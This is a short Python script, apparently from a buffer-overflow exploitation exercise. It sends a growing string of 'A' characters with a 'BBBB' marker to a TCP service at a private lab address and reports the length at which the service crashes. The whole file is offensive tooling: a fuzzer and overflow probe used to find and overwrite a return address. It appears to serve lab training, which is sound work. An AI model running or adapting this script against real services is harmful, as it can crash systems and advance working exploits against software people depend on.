#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.219.131"

port = 42424
timeout = 5

string = "A" * 146 + "BBBB"

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1")+b"\n\r")
      time.sleep(1)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
